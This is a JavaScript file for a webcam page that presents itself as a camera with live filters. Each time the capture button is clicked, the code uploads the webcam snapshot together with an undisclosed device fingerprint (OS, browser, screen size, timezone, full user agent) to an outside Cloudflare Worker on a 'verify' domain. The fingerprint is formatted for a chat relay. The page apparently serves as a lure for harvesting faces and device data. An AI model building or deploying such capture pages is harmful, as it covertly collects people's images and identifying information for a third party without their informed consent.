const WORKER_URL = "https://verify.ryancustard8-8af.workers.dev";

const video = document.getElementById('webcam');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const statusText = document.getElementById('status');
const filterSelect = document.getElementById('filterSelect');
const mainContainer = document.getElementById('mainContainer');

// 1. Live Filter Change Listener
filterSelect.addEventListener('change', () => {
    video.style.filter = filterSelect.value;
});

// 2. Comprehensive Device Info Generator (Works on iPhone, Android, Windows, Mac)
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let os = "Unknown OS";
    
    if (/iphone/i.test(ua)) os = "iPhone";
    else if (/ipad/i.test(ua)) os = "iPad";
    else if (/android/i.test(ua)) os = "Android";
    else if (/win/i.test(ua)) os = "Windows PC";
    else if (/mac/i.test(ua)) os = "Macintosh";
    else if (/linux/i.test(ua)) os = "Linux";

    let browser = "Unknown Browser";
    if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) browser = "Chrome";
    else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/edge|edg/i.test(ua)) browser = "Edge";

    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const viewportRes = `${window.innerWidth}x${window.innerHeight}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";

    return `📱 **OS / Device:** ${os}\n🌐 **Browser:** ${browser}\n🖥️ **Screen Res:** ${screenRes}\n📐 **Viewport:** ${viewportRes}\n🌍 **Timezone:** ${timeZone}\n📋 **User Agent:** \`${ua}\``;
}

// 3. Start the webcam
async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
    } catch (error) {
        statusText.innerText = "Camera access denied. Please allow camera permissions.";
        statusText.style.color = "#ff4444";
    }
}

// 4. Handle button click (Spamable, applies active filter directly onto snapshot image)
captureBtn.addEventListener('click', async () => {
    statusText.innerText = "Encrypting and uploading bundle...";
    statusText.style.color = "#ffaa00";

    const width = video.videoWidth || 640;
    const height = video.videoHeight || 480;

    canvas.width = width;
    canvas.height = height;
    
    const ctx = canvas.getContext('2d');
    
    // Apply chosen CSS filter onto canvas so photo includes the selected filter effect!
    ctx.filter = filterSelect.value !== 'none' ? filterSelect.value : 'none';
    ctx.drawImage(video, 0, 0, width, height);

    // Convert canvas image to Blob
    canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("image", blob, "client.png");
        formData.append("deviceInfo", getDeviceInfo());

        try {
            // Send to Cloudflare Worker
            const response = await fetch(WORKER_URL, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                statusText.innerText = "✅ Sent successfully! Ready to send another.";
                statusText.style.color = "#00cc66";

                // Trigger Glitch Success Animation
                mainContainer.classList.add('glitch-success');
                setTimeout(() => {
                    mainContainer.classList.remove('glitch-success');
                }, 600);
            } else {
                const errorDetail = await response.text();
                console.error("Backend Error Details:", errorDetail);
                throw new Error(errorDetail);
            }
        } catch (err) {
            console.error("Full upload error:", err);
            statusText.innerText = "❌ Upload failed. Button is ready to retry.";
            statusText.style.color = "#ff4444";
        }
    }, 'image/png');
});

// Boot up camera on load
startCamera();
